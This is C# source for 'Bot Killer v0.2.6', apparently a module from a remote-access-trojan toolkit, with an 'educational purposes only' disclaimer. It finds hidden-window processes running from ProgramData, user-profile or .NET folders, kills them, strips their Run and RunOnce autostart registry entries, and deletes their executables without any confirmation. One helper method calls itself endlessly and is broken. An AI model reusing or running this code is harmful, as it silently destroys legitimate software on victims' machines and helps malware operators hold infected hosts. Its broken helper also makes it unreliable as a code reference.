using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Principal;

//       │ Author     : NYAN CAT
//       │ Name       : Bot Killer v0.2.6
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace BotKiller
{
    //Must run 64bit
    class Program
    {
        static void Main()
        {
            RunBotKiller();
        }

        public static void RunBotKiller()
        {
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (Inspection(p.MainModule.FileName))
                        if (!IsWindowVisible(p.MainWindowHandle))
                        {
                            RemoveFile(p);
                        }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("RunBotKiller: " + ex.Message);
                }
            }
        }

        private static void RemoveFile(Process process)
        {
            try
            {
                string processName = process.MainModule.FileName;
                process.Kill();
                RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\Run", processName);
                RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", processName);
                System.Threading.Thread.Sleep(100);
                File.Delete(processName);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("RemoveFile: " + ex.Message);
            }
        }

        private static bool Inspection(string threat)
        {
            if (threat == Process.GetCurrentProcess().MainModule.FileName) return false;
            if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) return true;
            if (threat.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))) return true;
            if (threat.Contains("wscript.exe")) return true;
            if (threat.StartsWith(Path.Combine(Path.GetPathRoot(Environment.SystemDirectory), "Windows\\Microsoft.NET"))) return true;
            return false;
        }

        private static bool IsWindowVisible(string lHandle)
        {
            return IsWindowVisible(lHandle);
        }

        private static void RegistryDelete(string regPath, string payload)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
                {
                    if (key != null)
                        foreach (string valueOfName in key.GetValueNames())
                        {
                            if (key.GetValue(valueOfName).ToString().Equals(payload))
                                key.DeleteValue(valueOfName);
                        }
                }
                if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                    {
                        if (key != null)
                            foreach (string valueOfName in key.GetValueNames())
                            {
                                if (key.GetValue(valueOfName).ToString().Equals(payload))
                                    key.DeleteValue(valueOfName);
                            }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("RegistryDelete: " + ex.Message);
            }
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

    }
}